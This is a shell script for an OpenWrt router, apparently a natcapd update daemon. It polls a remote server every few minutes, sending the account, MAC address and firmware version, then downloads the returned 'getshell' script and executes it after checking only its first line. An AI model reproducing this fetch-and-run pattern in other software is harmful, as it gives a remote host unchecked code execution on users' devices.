#!/bin/sh

ACC=$1
ACC=`echo -n "$ACC" | base64`
CLI=`sed 's/:/-/g' /sys/class/net/eth0/address`

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rmdir $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		exit 1
	fi
}

gfwlist_update_main () {
	mkfifo /tmp/trigger_gfwlist_update.fifo
	(while :; do
		test -p /tmp/trigger_gfwlist_update.fifo || { sleep 1 && continue; }
		cat /tmp/trigger_gfwlist_update.fifo >/dev/null && {
			sh /usr/share/natcapd/gfwlist_update.sh
		}
	done) &
	test -p /tmp/trigger_gfwlist_update.fifo && echo >>/tmp/trigger_gfwlist_update.fifo
	while :; do
		sleep 60
		test -p /tmp/trigger_gfwlist_update.fifo && echo >>/tmp/trigger_gfwlist_update.fifo
		sleep 86340
	done
}

main_trigger() {
	. /etc/openwrt_release
	VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | base64`
	VER=`echo $VER | sed 's/ //g'`
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
	while :; do
		test -p /tmp/trigger_natcapd_update.fifo || { sleep 1 && continue; }
		cat /tmp/trigger_natcapd_update.fifo >/dev/null && {
			rm -f /tmp/xx.sh
			rm -f /tmp/nohup.out
			ACC=`uci get natcapd.default.account 2>/dev/null`
			/usr/bin/wget --ca-certificate=/tmp/cacert.pem -qO /tmp/xx.sh \
				"https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI&ver=$VER"
			head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
				chmod +x /tmp/xx.sh
				nohup /tmp/xx.sh &
			}
		}
	done
}

main() {
	mkfifo /tmp/trigger_natcapd_update.fifo
	main_trigger &
	test -p /tmp/trigger_natcapd_update.fifo && echo >>/tmp/trigger_natcapd_update.fifo
	while :; do
		sleep 120
		test -p /tmp/trigger_natcapd_update.fifo && echo >>/tmp/trigger_natcapd_update.fifo
		sleep 540
	done
}

nop_loop () {
	while :; do
		sleep 86400
	done
}

if mkdir $LOCKDIR 2>/dev/null; then
	trap "cleanup" EXIT

	echo "Acquired lock, running"

	gfwlist_update_main &
	main &
	nop_loop
else
	echo "Could not create lock directory '$LOCKDIR'"
	exit 0
fi